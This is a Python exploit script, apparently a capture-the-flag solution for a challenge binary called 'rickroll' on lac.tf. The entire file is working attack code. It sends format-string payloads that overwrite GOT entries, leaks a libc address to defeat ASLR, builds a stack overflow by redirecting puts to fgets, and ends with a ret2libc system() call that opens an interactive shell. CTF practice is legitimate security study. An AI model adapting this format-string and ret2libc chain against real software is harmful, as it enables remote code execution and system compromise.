#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from rootkit.exploit import ret2libcsystem
from time import sleep

exe = context.binary = ELF("./rickroll")
host = args.HOST or "lac.tf"
port = int(args.PORT or 31135)

gdbscript = """
tbreak main
b *0x4011e7
continue
""".format(
    **locals()
)

libc = SetupLibcELF()
io = start()

call_fgets = 0x04011B3

writes = {
    exe.sym["main_called"] - 4: 0x1,
    exe.got["puts"]: 0x2F1141,
}  # make main_called as NULL and puts got to the address of main function

payload = fmtstr_payload(7, writes, write_size="short", numbwritten=0)

re()

sl(b"%39$pAAA" + payload)
reu(b"Never gonna run around and ")
leak = int(reu(b"AAA").strip(b"AAA"), 16)
print(hex(leak))
libc.address = leak - 0x23D0A
lb()

payload = fmtstr_payload(
    6,
    {
        exe.got["fgets"]: libc.sym.gets,
        exe.got["puts"]: call_fgets,
        exe.got["printf"]: gadget("leave; ret"),
    },
    write_size="short",
)  # create a stack buffer overflow by turning got of puts which calls fgets and gives us stack overflow primitive.

re()
sl(payload)
re()
sl(b"A" * 264 + ret2libcsystem())
io.clean()

io.interactive()
